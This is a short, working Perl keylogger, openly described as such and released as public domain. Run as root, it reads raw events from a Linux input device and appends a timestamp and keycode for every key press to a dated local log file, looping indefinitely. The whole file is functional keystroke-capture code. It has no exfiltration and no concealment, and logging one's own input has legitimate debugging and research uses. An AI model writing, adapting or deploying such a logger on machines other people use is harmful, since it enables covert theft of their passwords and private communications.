#!/usr/bin/perl -w

#This is a keylogger which simply records every key pressed and logs it to a 
#file. You may need to change the input file, take a look in /dev/input/by-path/
#to see what's avaliable.

#This code is public domain.

use strict;

my $DEV = '/dev/input/event4';

if (!-r $DEV) {
	print "Cannot read $DEV\n";
	print "Are you root?\n";
	exit 1;
}

open FILE,$DEV;

mkdir "logs";
my $logfilename = "logs/".`date +%F`;
print "Logging to $logfilename";
chomp $logfilename;
open LOGFILE, ">>${logfilename}.log"; #>> appends, use > to clear file on open

while (1) {
    my $line = "";
    sysread(FILE,$line,16);
    my @vals = split(//,$line);

    if (ord($vals[10]) != 0) {
        interpret(ord($vals[10]),ord($vals[12]));
    }
}

close LOGFILE;
close FILE;

sub interpret {
    my $keycode = shift;
    my $state = shift;
    #state:
    #0 -> key up
    #1 -> key down
    #2 -> key repeat (held down)

    if ($state == 1) {
    	my $time = `date +%H:%M:%S`;
    	chomp $time;
    	print LOGFILE "$time,$keycode\n"; #logs as HH:MM:SS,keycode
    }

}

